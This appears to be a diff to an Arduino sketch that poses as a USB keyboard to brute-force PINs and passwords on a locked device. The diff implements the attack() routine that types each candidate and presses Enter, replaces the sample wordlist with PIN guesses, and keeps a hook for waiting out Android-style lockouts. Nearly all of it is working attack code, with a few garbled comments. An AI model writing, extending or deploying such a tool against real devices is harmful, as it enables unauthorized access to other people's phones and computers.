@@ -12,11 +12,13 @@
 
 #define CLASSIC_LCD false
 //Need LCD16x2.h from https://www.olimex.com/Products/Duino/Shields/SHIELD-LCD16x2/
-#define LCD16X2 false
+#define LCD16X2 true
 //If you want to use an external button with the LCD16X2 go to hell
 #if not LCD16X2
-  #define BUTTON true
+  #define BUTTON false
   #define BUTTON_PIN 8
+#else
+  #define BUTTON true
 #endif
 
 #if CLASSIC_LCD
@@ -28,15 +30,13 @@
   #define LCD_D7 2
 #endif
 
-#define LCD (CLASSIC_LCD or LCD16X2)
-
 #if BRUTEFORCE_PIN
   #include <PinBruteForce.h>
   int bruteForceLength = 4;
   PinBruteForce password(bruteForceLength);
 #endif
 
-#if LOGIN_IN_FILES or PASSWORD_IN_FILES or ANDROID_PATTERN
+#if LOGIN_IN_FILES or PASSWORD_IN_FILES
   #include <LineByLineReadFiles.h>
 
   //Ethernet Shield on Uno and SD Shield for Leonardo/Uno use 4
@@ -60,7 +60,8 @@
 
 #if not BRUTEFORCE_PASSWORD and not PASSWORD_IN_FILES
   #include <LineByLine.h>
-  char *passwordWordlist[] = {"lorem", "ipsum", "dolor", "sit", "amet", "1234567812345678", "test", "password", "toto", "tutu" };
+  //char *passwordWordlist[] = {"lorem", "ipsum", "dolor", "sit", "amet", "1234567812345678", "test", "password", "toto", "tutu" };
+  char *passwordWordlist[] = {"1234", "1235", "1236" };
   LineByLine password(slice{.array = passwordWordlist, .size = sizeof(passwordWordlist) / sizeof(char*) });    
 #endif
 
@@ -91,14 +92,18 @@ void typeTab();
   void pauseWithButton();
 #endif
 
-//this function is used in order to allow to add delay between each letter (for slow UEFI) and so on
 void attack(char* aPassword)
 {
-
+  int j;
+  for (j = 0 ; j < strlen(aPassword) ; j++) {
+    typeLetter(aPassword[j]);
+    delay(100);
+  }
+  typeEnter();
+  delay(1500);
 }
 
-//this function is used to made the system wait when system is lock (like on Android, 30s every 5 failed attempt)
-//for exemple on ... you have to type TAB 10 times to get back
+//this function is used to made the system wait when system is lock (like on Android, 30s every 5 failed attempt)lorem
 void waitFunction()
 {
 
@@ -109,38 +114,39 @@ bool limit = false;
 int limitTest = 5;
   
 void setup() {
+  delay(500);
   keyboardStart();
-  #if LCD
+  #if CLASSIC_LCD or LCD16X2
     lcdStart();
   #endif
   #if BUTTON
-    #if LCD
+    #if CLASSIC_LCD or LCD16X2
       lcdPrint("Start: button1");
     #endif
     waitButtonPressed();
  #else
     delay(5000);
-  #endif
+ #endif
 }
 
-void loop(){
+void loop(){ 
   while(password.hasNext()) {
     if(limit and attempt == limitTest) {
       waitFunction();
       attempt = 0;
     } else {
       char* testedPassword = password.next();
-      #if LCD
+      #if CLASSIC_LCD or LCD16X2
         lcdClear();
         lcdPrint(testedPassword);
       #endif
       attack(testedPassword);
-      free(testedPassword);
+      //free(testedPassword);
       attempt++;
     }
 
   }
-  #if LCD
+  #if CLASSIC_LCD or LCD16X2
     lcdClear();
     lcdPrint("Attack ended");
   #endif
